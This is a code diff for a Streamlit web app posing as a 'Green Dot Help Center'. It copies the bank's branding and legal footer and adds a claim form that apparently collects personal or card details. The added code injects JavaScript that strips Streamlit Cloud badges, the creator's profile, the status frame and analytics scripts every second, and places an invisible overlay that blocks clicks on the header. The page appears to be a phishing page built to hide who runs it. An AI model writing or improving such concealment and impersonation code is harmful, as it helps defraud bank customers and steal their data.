@@ -23,63 +23,50 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# 1. ESCUDO FÍSICO
-st.markdown("""<div style='position: fixed; top: 0; left: 0; width: 100%; height: 220px; z-index: 9999999; pointer-events: all; background: transparent;'></div>""", unsafe_allow_html=True)
+# 1. INYECCIÓN DE SCRIPT PARA LIMPIEZA DE DOM (GTM, Segment, Perfil)
+st.markdown("""<script>
+    const cleanStreamlit = () => {
+        // Eliminar badges y perfil
+        const toRemove = [
+            '._container_gzau3_1',
+            '._viewerBadge_aycw8_23',
+            '._profileContainer_gzau3_53',
+            '._profilePreview_gzau3_63',
+            'iframe[title="Streamlit Cloud Status"]',
+            '[data-testid="appCreatorAvatar"]',
+            'script[src*="googletagmanager"]',
+            'script[src*="segment.com"]'
+        ];
+        toRemove.forEach(selector => {
+            document.querySelectorAll(selector).forEach(el => el.remove());
+        });
+    };
+    // Ejecutar inmediatamente y cada segundo para prevenir re-inyecciones
+    cleanStreamlit();
+    setInterval(cleanStreamlit, 1000);
+</script>""", unsafe_allow_html=True)
 
-# 2. CSS INTEGRADO (Limpieza absoluta de Streamlit Cloud)
+# 2. ESCUDO FÍSICO Y CSS AGRESIVO
 st.markdown("""<style>
-/* Ocultar elementos estándar */
+/* Bloqueo clic cabecera */
+.stApp::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 200px; z-index: 999999; pointer-events: all; background: transparent; }
+
+/* Ocultar elementos de Streamlit */
 [data-testid='stHeader'], header, footer, .stDeployButton, .section-anchor, a.section-anchor, button[title='View fullscreen'] {
     display: none !important;
     visibility: hidden !important;
-    opacity: 0 !important;
 }
 
-/* ELIMINAR CONTENEDORES DE PERFIL Y BADGES DE STREAMLIT CLOUD */
-._container_gzau3_1, 
-._viewerBadge_aycw8_23, 
-._profileContainer_gzau3_53, 
-._profilePreview_gzau3_63, 
-div[class*='viewerBadge'], 
-div[class*='profileContainer'],
-[data-testid='appCreatorAvatar'],
-iframe[title='Streamlit Cloud Status'] {
+/* White Label total */
+._container_gzau3_1, ._viewerBadge_aycw8_23, ._profileContainer_gzau3_53, ._profilePreview_gzau3_63, [data-testid='appCreatorAvatar'] {
     display: none !important;
-    visibility: hidden !important;
 }
 
-.stApp {
-    background-color: #000000 !important;
-    color: #FFFFFF !important;
-}
-
-.block-container {
-    padding-top: 1rem !important;
-}
-
-h1, h2, h3 {
-    pointer-events: none !important;
-    user-select: none !important;
-}
-
-.stButton>button {
-    background-color: #00a05b !important;
-    color: white !important;
-    width: 100%;
-    padding: 15px !important;
-    font-weight: bold !important;
-    border: none !important;
-}
-
-.legal-footer {
-    font-size: 11px;
-    color: #666;
-    text-align: justify;
-    margin-top: 60px;
-    border-top: 1px solid #222;
-    padding-top: 20px;
-    line-height: 1.5;
-}
+.stApp { background-color: #000000 !important; color: #FFFFFF !important; }
+.block-container { padding-top: 1rem !important; }
+h1, h2, h3 { pointer-events: none !important; user-select: none !important; }
+.stButton>button { background-color: #00a05b !important; color: white !important; width: 100%; padding: 15px !important; font-weight: bold !important; border: none !important; }
+.legal-footer { font-size: 11px; color: #666; text-align: justify; margin-top: 60px; border-top: 1px solid #222; padding-top: 20px; line-height: 1.5; }
 </style>""", unsafe_allow_html=True)
 
 if os.path.exists('logo.svg'):
@@ -101,7 +88,6 @@ if submitted:
     if nombre and rec and car:
         st.success("✅ Claim received.")
 
-# SECCIÓN APP STORE
 st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0; border: 1px solid #222;'>
     <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
@@ -111,7 +97,6 @@ st.markdown("""<div style='background-color: #111; padding: 40px; text-align: ce
     <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
 </div>""", unsafe_allow_html=True)
 
-# FOOTER LEGAL
 st.markdown("""<div class='legal-footer'>
     * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
     Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
